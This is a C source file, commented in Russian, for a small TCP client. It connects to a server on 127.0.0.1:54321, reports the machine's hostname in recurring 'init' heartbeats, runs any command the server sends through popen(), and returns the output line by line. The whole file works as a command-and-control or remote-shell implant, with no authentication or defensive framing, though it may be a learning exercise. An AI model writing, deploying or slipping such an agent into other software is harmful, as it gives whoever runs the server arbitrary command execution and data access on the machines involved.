
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>

#define port 54321
#define hostname_len 256
#define buffer_size 1024

void send_init(int sock);
void send_done_payload(FILE *fp, int sock);
void handle_response(char *buffer, int sock);
void do_payload(char *buffer, int sock);

// network
int conn() {
    int sock;
    struct sockaddr_in serv_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0)
        return -1;

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        return -1;

    return sock;
}



// logic
char* get_init_str() {
    char *buffer = malloc(hostname_len);
    if (!buffer) return NULL;

    char hostname[hostname_len];

    if (gethostname(hostname, sizeof(hostname)) == -1) {
        free(buffer);
        return NULL;
    }

    snprintf(buffer, hostname_len,
             "type: init, payload: %s\n", hostname);

    return buffer;
}

void do_payload(char *buffer, int sock) {
    FILE *fp;

    fp = popen(buffer, "r");
    if (fp == NULL) {
        perror("popen failed");
        return;
    }
    send_done_payload(fp, sock);
    
    pclose(fp);
}



// senders
void send_init(int sock) {
    char *init = get_init_str();
    if (!init) return;

    send(sock, init, strlen(init), 0);
    printf("отправлен init: %s", init);

    free(init);
}


void send_done_payload(FILE *fp, int sock) {
    char line[128];
    char out[256];

    while (fgets(line, sizeof(line), fp) != NULL) {
        printf("%s", line);

        snprintf(out, sizeof(out),
                 "type: client_line, payload: %s\n", line);

        send(sock, out, strlen(out), 0);
    }
}




// readers
void handle_response(char *buffer, int sock) {
    printf("ответ сервера: %s\n", buffer);

    if (strstr(buffer, "ok") != NULL) {
        printf("сервер подтвердил соединение\n");
    }

    else if (strstr(buffer, "message") != NULL) {
        printf("📩 получено сообщение от сервера\n");

        char *payload = strstr(buffer, "payload:");

        if (payload != NULL) {
            payload += strlen("payload:");  // сдвигаемся к значению

            // убираем пробелы в начале
            while (*payload == ' ') payload++;
            
            do_payload(payload, sock);
        } else {
            printf("payload не найден\n");
        }
    }

    else if (strstr(buffer, "unknown") != NULL) {
        printf("сервер не понял сообщение\n");
    }
    else {
        printf("неизвестный тип ответа\n");
    }
}

// start
void run_client(int sock) {
    char buffer[buffer_size];

    printf("клиент запущен\n");

    // 🔥 первый init
    send_init(sock);

    while (1) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);

        struct timeval timeout;
        timeout.tv_sec = 30;
        timeout.tv_usec = 0;

        int activity = select(sock + 1, &readfds, NULL, NULL, &timeout);

        if (activity < 0) {
            perror("select");
            break;
        }

        // 📥 данные от сервера
        if (activity > 0 && FD_ISSET(sock, &readfds)) {
            int bytes = recv(sock, buffer, buffer_size - 1, 0);

            if (bytes <= 0) {
                printf("сервер отключился\n");
                break;
            }

            buffer[bytes] = '\0';
            handle_response(buffer, sock);
        }

        // ⏱ heartbeat
        if (activity == 0) {
            printf("отправка heartbeat...\n");
            send_init(sock);
        }
    }
}

int main() {
    int sock = conn();
    if (sock < 0) {
        printf("ошибка подключения\n");
        return 1;
    }

    run_client(sock);

    close(sock);
    return 0;
}

